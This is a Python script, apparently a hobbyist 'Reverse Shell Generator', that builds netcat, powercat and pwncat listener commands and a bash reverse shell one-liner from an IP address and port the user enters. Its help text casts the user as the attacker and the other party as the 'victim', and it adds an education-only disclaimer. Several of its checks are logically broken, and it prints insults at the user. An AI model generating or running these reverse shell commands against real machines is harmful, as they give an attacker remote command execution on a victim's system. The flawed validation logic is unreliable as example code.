import time 
import random
restart = True
insult = [""]*7
# Def section 

# Lost insults 
insult = ["I always knew you were a skid", "If you need help just call the numebr 0121do1", "You are making me want to create a special needs version for people like you", "You obviously dont own an airfryer", "I'm surprised you managed to spell your name correctly", "Your the type of person which would invent a chocolate teapot", "It would be an insult to skids to call you a skid"]
# For people who are REALLY lost
lost = '''
        *   0

   *         *
      🚀
    .              *
   ..        
  ...      
 ....
......
'''

# Help menu
help = '''

This tool is only supported so far on linux and windows and is designed 
for dummies or professionals

To use this tool you simply type in your port number and ip address and it 
will open up a connection between you and your target machine which you can 
then run commands on your behalf

The attacker "you" will run the listener command in your terminal and 
the victim should run the attack command in their terminal

To find your ip
Windows: 
Go to command prompt and type in "ipconfig" and hit enter and copy the number
which starts with 192...

Linux : 
Open up terminal and type "ifconfig" and hit enter and copy the number
which starts with 192...

And your port doesnt really matter but we reccomend using port "8080" for compatibility

For example your ip could be 192.16.28.1 and the port could be 1034

If you have no idea what I just said then this tool is probably not for you,
maybe learn about web and networking and then come back :)

This tool is for education purposes only and is designed to be ran on devices which 
your own or have permission to use.
We are not reliable for any damage done to any machines or devices.

'''
# Outro 
outro = f'''
<------------------------------------------------>
      
            made by Ohno
      
        feel free to checkout the github at 
            https://github.com/OhnoMain 
              
      
<------------------------------------------------->             
\n
'''

banner = '''
██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗                    
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝                    
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗                      
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝                      
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗                    
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝                    
                                                                             
███████╗██╗  ██╗███████╗██╗     ██╗                                          
██╔════╝██║  ██║██╔════╝██║     ██║                                          
███████╗███████║█████╗  ██║     ██║                                          
╚════██║██╔══██║██╔══╝  ██║     ██║                                          
███████║██║  ██║███████╗███████╗███████╗                                     
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                     
                                                                             
 ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                             
                    made by Ohno
'''



# Def bit inprogress #############

def feet():
    time.sleep(1)
    print(lost)
    num = random.randint(1,7)
    print(insult[num])
    time.sleep(2)

#########################
print(banner)


time.sleep(1)
print("")
print("")
print("")
print("Welcome")
name = input("Please enter your name: ")

# Getting the terminal style thing ready 
kali = f"┌──(root㉿{name})-[~]"


# Help statement
while restart == True:
    instructions = input(f"Would you like a quick tutorial {name} ?(y/n): ")
    if instructions == "y":
        print(help)
        print(kali)
        input("└─Press enter to continue:# ")
    print("")


    print("Please select a number from the list for the listener: ")
    print("""
          1. Netcat
          2. Powercat 
          3. Pwncat
          4. Msfconsole
    """)
    # General selection
    print(kali)
    choice = int(input("└─# "))
    # Restricted choice
    while choice >4 or choice <1:
        print("ERROR!")
        feet()
        print("")                   
        print(f"{choice} is not a valid number")
        print("Please enter a valid number")
        print(kali)
        choice = int(input("└─# "))       
    print("")
    print("Please select a number from the list for the attack: ")
    print("""
          1. Bash-i 
          2. Powershell 
          3. 
          4. 
    """)
    print(kali)
    attack = int(input("└─# "))
    print("")

    # Restricted choice 
    while attack >4 or attack <1:
        print("ERROR!")
        feet()
        time.sleep(1)
        print(f"{attack} is not a valid number")
        print("Please enter a valid number")
        print(kali)
        attack = int(input("└─# ")) 

    port = int(input("What port would you like to listen on (leave blank for port 8080)?: "))
    if port == "":
        port = 8080
    # Restricted choice 
    while port <0 or port >65535:
        print("ERROR!")
        feet()
        print(f"{port} is not a valid port number")
        print("Please enter a port between 0 and 65535 (inclusive)")
        print("")
        port = input("What port would you like to listen on (leave blank for port 8080)?: ")

    ip = input("What ip would you like to listen on?: ")
    print("")
    while len(ip) <3 and len(ip) >12:
        print("ERROR!")
        feet()
        print(f"{ip} is not a valid ip address, make sure to include the dots")
        ip = input("What ip would you like to listen on?: ")
    # sets bash_i to the correct thing for the bash script 
    bash_i = f"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
    powershell = f"Put the powershell script here"

## Attack ##
    if attack == 1:
        atk = (bash_i)
    if attack == 2:
        atk = (powershell)
    if attack == 3:
        atk = ("in construction")
    if attack == 4:
        atk = ("in construction")


## Listener ##

    # Netcat choice 
    if choice == 1:
        li = f"nc -lvnp {port}"
    # Powercat choice 
    if choice == 2:
        li = f"powercat -l -p {port}"
    # pwncat choice 
    if choice == 3:
        li = f"python3 -m pwncat -lp {port}"
    # Msfconsole choice 
    # I am not using else incase I want to add more options
    if choice == 4:
        li = "In progress" # The listner is not working for msf as it includes "" which kinda mess up the print statement

    print(f"""
    🚀===
    Listener: 
    {li}
    Attack:
    {atk}
    ===🚀
    \n
    """)

    choice = input("Would you like to start again?(y/n): ")
    while choice !="y" or choice !="n":
        feet()
        print("Please enter y or n")
        choice = input("Would you like to start again?(y/n): ")
    if choice == "n":
        restart = False
    time.sleep(1)

# Displaying end banner called outro 
print(outro)

time.sleep(3)    
input("Press enter to exit: ")
